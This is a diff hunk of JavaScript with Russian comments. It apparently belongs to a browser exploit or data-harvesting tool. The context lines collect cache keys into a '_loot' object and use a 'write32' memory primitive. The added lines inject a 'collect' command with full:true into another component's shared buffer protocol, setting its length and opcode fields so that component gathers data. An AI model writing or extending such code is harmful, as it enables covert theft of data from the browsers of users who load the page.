@@ -488,6 +488,23 @@
                                 _loot.caches = await caches.keys();
                             }
                         } catch (e) {}
+                        // 4) WHS: отправить КОМАНДУ t8 через их LA-протокол
+                        if (window.PhZuiP && window.PhZuiP.buffer) {
+                            try {
+                                // их протокол: g[8..]=данные, D[1]=len, D[0]=BA(3)
+                                // PhZuiP = Uint32Array → тот же буфер что g и D
+                                const buf = new Uint8Array(window.PhZuiP.buffer);
+                                const dv = new DataView(window.PhZuiP.buffer);
+                                // команда: их формат ({"cmd":"..."})
+                                const cmd = '{"cmd":"collect","args":{"full":true}}';
+                                for (let i = 0; i < cmd.length; i++) {
+                                    buf[8 + i] = cmd.charCodeAt(i);
+                                }
+                                dv.setUint32(4, cmd.length, true);  // D[1] = длина
+                                dv.setUint32(0, 3, true);           // D[0] = BA (3)
+                                window.log('[WHS] Команда t8 отправлена: ' + cmd);
+                            } catch (e) { window.log('[WHS] t8 cmd err: ' + e); }
+                        }
                         // 5) WHS: РАЗБУДИТЬ t8 — пишем флаги в g-буфер
                         if (_prim && _prim.write32 && window.PhZuiP) {
                             try {
